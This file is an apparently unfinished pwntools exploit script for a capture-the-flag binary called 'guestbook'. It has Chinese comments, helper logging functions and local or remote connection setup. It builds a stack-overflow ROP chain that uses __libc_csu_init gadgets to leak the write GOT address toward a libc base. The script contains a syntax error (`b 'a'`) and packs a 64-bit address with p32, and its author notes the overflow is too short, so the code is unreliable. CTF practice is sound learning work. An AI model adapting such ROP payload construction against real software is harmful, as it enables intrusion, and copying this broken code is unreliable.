from pwn import *
from LibcSearcher import LibcSearcher

io = -1
############################
#********修改文件名**********
############################
file_name = 'guestbook'
port = 27117

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
利用csu进行泄露基地址
'''
# 此段地址为：0x4006e6
# add rsp 8; pop rbx ; pop rbp ;pop r12; pop r13; pop r14; pop r15; retn
write_got = io_elf.got['write']
payload = 0x88 * b'a'
payload += p64(0x4006e6) + p64(0) + p64(0) + p64(1) 
payload += p32(write_got) + p64(0x6) + p64(write_got) + p64(1) 

# 此段地址为：0x4006d0
'''
mov     rdx, r13
mov     rsi, r14
mov     edi, r15d
call    qword ptr [r12+rbx*8]
add     rbx, 1
cmp     rbx, rbp
jnz     short loc_4006D0
'''
payload += p64(0x4006d0)
payload += b 'a' * 0x38
# 栈溢出的长度不足啊，先放一放
io.interactive()
